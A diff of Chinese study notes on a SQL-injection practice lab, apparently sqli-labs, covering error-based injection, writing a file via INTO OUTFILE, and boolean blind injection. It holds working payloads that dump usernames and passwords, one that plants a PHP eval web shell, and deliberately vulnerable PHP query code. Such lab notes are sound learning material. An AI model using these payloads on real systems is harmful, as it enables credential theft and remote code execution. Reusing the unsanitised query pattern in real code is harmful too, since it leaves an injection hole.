@@ -306,6 +306,9 @@ id=1' union select 1,count(*), concat((select database()), floor(rand()*2))as a 
 
 其余步骤同上。
 
+```
+```
+
 1' union select 1,count(*), concat((
 select concat( (select group_concat(username) from security.users) , (select group_concat(password) from security.users) , floor(rand()*2) )
 ), floor(rand()*2))as a from information_schema.tables group by a
@@ -340,7 +343,7 @@ select count(*), concat((select group_concat(username) from security.users), flo
 
 
 
-## §2.7 第七关 导出数据库
+## §2.7 第7关 导出数据库
 
 老三样：
 
@@ -360,7 +363,26 @@ select count(*), concat((select group_concat(username) from security.users), flo
 id=1‘)) union select null,'<?php eval($_GET('test')) ?>',null into outfile './1.php' 
 ```
 
- 
+ ？？？？？？？？？？？？？？？？？？？？？？
+
+
+
+
+
+## §2.8 第8关 布尔盲注
+
+```php
+$sql="SELECT * FROM users WHERE id='$_GET['id']' LIMIT 0,1";
+if(mysql_fetch_array(mysql_query($sql))){
+    echo 'Success';
+}else{
+    echo 'error';
+}
+```
+
+穷举`database()`的字符串个数，
+
+
 
 # §3 SQL注入方法论
 
